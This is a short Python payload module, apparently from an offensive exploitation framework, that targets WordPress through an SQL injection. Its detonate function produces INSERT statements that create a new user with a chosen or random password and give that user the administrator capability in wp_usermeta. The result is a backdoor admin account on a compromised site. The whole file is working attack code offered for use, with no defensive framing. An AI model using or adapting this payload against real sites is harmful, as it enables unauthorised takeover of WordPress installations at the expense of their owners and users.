import os
from helpers import uid, pinfo, pwarn

#
# RCE   Remote Code Execution
# FILEi File Inclusion
# SQLi  SQL Injection (write access)
# SQLr  SQL Read access
# XSSs  XSS Stored
# XSSr  XSS Reflected

##
# Dependency
# What dependency does this payload have
def get_dep():
    return ['SQLi']

##
# Detonate payload
# Return the code to execute
# or the file path to be uploaded
def detonate(vuln, args):
    if vuln == 'SQLi':
        if args.pos:
            user = args.pos[0]
            password = args.pos[1]
            email = args.pos[2]
        else:
            user = uid()
            password = uid()
            email = uid() + "@" + uid() + ".com"
        
        pinfo("Inserting new admin user")
        pwarn("User:", user)
        pwarn("Password:", password)
        pwarn("Email:", email)

        privs = 'a:1:{s:13:"administrator";s:1:"1";}'
        return [
            "INSERT INTO {$wpdb->users} SET `user_login`='"+user+"', `user_email`='"+email+"', `user_pass`=MD5('"+password+"');",
            "INSERT INTO {$wpdb->usermeta} SET `user_id`='#iid#', `meta_key`='wp_capabilities', `meta_value`='a:1:{s:13:\\\"administrator\\\";s:1:\\\"1\\\";}';"
        ]
